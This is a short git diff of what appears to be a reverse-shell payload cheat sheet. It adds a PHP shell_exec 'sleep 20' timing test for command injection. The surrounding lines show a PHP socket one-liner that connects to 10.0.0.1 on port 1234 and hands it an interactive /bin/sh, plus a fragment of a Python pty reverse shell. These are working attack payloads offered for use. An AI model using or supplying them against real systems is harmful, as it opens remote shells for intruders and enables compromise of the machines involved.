@@ -93,6 +93,11 @@ import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);
 
 ### PHP
 
+Simple Test
+```
+<?php echo shell_exec("sleep 20") ; ?> 
+```
+
 Reverse shell using a socket (cmd version)
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
